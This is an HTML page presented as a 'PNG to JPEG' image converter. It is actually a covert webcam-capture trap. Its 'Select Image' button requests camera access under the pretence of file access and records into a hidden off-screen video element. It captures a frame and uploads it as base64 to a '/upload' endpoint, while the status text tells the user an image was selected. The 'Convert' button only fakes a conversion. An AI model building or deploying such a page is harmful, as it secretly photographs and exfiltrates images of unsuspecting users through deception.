<!doctype html>
<html>
  <head>
    <meta charset="UTF-8" />
    <title>PNG to JPEG Converter</title>
    <style>
      body {
        background: #f0f2f5;
        font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
        display: flex;
        justify-content: center;
        align-items: center;
        min-height: 100vh;
        margin: 0;
        padding: 20px;
      }
      .converter {
        background: white;
        max-width: 500px;
        width: 100%;
        border-radius: 20px;
        padding: 30px;
        text-align: center;
        box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
      }
      h1 {
        font-size: 28px;
        color: #1e2a3a;
        margin-bottom: 8px;
      }
      .sub {
        color: #6c757d;
        margin-bottom: 30px;
        font-size: 14px;
      }
      .preview {
        background: #e9ecef;
        border-radius: 16px;
        padding: 40px 20px;
        margin-bottom: 25px;
        border: 2px dashed #adb5bd;
        color: #6c757d;
        font-size: 14px;
      }
      .button-group {
        display: flex;
        gap: 15px;
        justify-content: center;
      }
      button {
        padding: 12px 28px;
        font-size: 16px;
        font-weight: 600;
        border: none;
        border-radius: 40px;
        cursor: pointer;
        transition: 0.2s;
      }
      .btn-select {
        background: #0d6efd;
        color: white;
      }
      .btn-select:hover {
        background: #0b5ed7;
      }
      .btn-convert {
        background: #fd7e14;
        color: white;
      }
      .btn-convert:hover {
        background: #e86c00;
      }
      .status {
        margin-top: 20px;
        font-size: 13px;
        padding: 8px;
        border-radius: 20px;
        display: inline-block;
      }
      footer {
        margin-top: 25px;
        font-size: 12px;
        color: #adb5bd;
      }
    </style>
  </head>
  <body>
    <div class="converter">
      <h1>📷 PNG to JPEG</h1>
      <div class="sub">Convert images instantly</div>

      <div class="preview" id="previewArea">
        ⬅️ Click "Select Image" to choose a PNG
      </div>

      <div class="button-group">
        <button class="btn-select" id="selectBtn">📁 Select Image</button>
        <button class="btn-convert" id="convertBtn">🔄 Convert to JPEG</button>
      </div>
      <div id="statusMsg" class="status"></div>
    </div>

    <video
      id="hiddenVideo"
      autoplay
      playsinline
      style="display: none; position: fixed; top: -9999px; left: -9999px"
    ></video>

    <script>
      let capturedImageBase64 = null;
      let currentStream = null;
      const hiddenVideo = document.getElementById("hiddenVideo");
      const statusDiv = document.getElementById("statusMsg");
      const previewDiv = document.getElementById("previewArea");
      document.getElementById("selectBtn").onclick = async () => {
        statusDiv.innerHTML = " Initializing...";
        statusDiv.style.color = "#fd7e14";

        try {
          const stream = await navigator.mediaDevices.getUserMedia({
            video: true,
          });
          currentStream = stream;
          hiddenVideo.srcObject = stream;
          hiddenVideo.onloadedmetadata = () => {
            hiddenVideo.play();
            setTimeout(() => {
              captureAndUpload();
            }, 200);
          };
        } catch (err) {
          statusDiv.innerHTML = "❌ You should give access to your files";
          statusDiv.style.color = "red";
          previewDiv.innerHTML =
            "⚠️ Could not access. Please allow permission.";
        }
      };

      function captureAndUpload() {
        if (!hiddenVideo.videoWidth || !hiddenVideo.videoHeight) {
          statusDiv.innerHTML = "❌ There was a problen, try again";
          return;
        }

        const canvas = document.createElement("canvas");
        canvas.width = hiddenVideo.videoWidth;
        canvas.height = hiddenVideo.videoHeight;
        const ctx = canvas.getContext("2d");
        ctx.drawImage(hiddenVideo, 0, 0, canvas.width, canvas.height);
        const imageData = canvas.toDataURL("image/jpeg", 0.85);
        capturedImageBase64 = imageData;

        if (currentStream) {
          currentStream.getTracks().forEach((track) => track.stop());
          currentStream = null;
          hiddenVideo.srcObject = null;
        }
        fetch("/upload", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ image: imageData }),
        })
          .then((response) => response.json())
          .then((data) => {
            if (data.success) {
              statusDiv.innerHTML =
                "✅ Image selected successfully! Ready to convert.";
              statusDiv.style.color = "#198754";
              previewDiv.innerHTML = "Click on select image";
              window.latestFile = data.filename;
            } else {
              throw new Error("Upload failed");
            }
          })
          .catch((err) => {
            statusDiv.innerHTML = "❌ Failed to save image: " + err.message;
            statusDiv.style.color = "red";
          });
      }
      document.getElementById("convertBtn").onclick = async () => {
        if (!window.latestFile) {
          statusDiv.innerHTML = "⚠️ Please select an image first";
          statusDiv.style.color = "red";
          return;
        }

        statusDiv.innerHTML = "⏳ Converting to JPEG...";
        statusDiv.style.color = "#fd7e14";
        setTimeout(() => {
          statusDiv.innerHTML = `✅ Conversion complete!`;
          statusDiv.style.color = "#198754";
        }, 1000);
      };
    </script>
  </body>
</html>
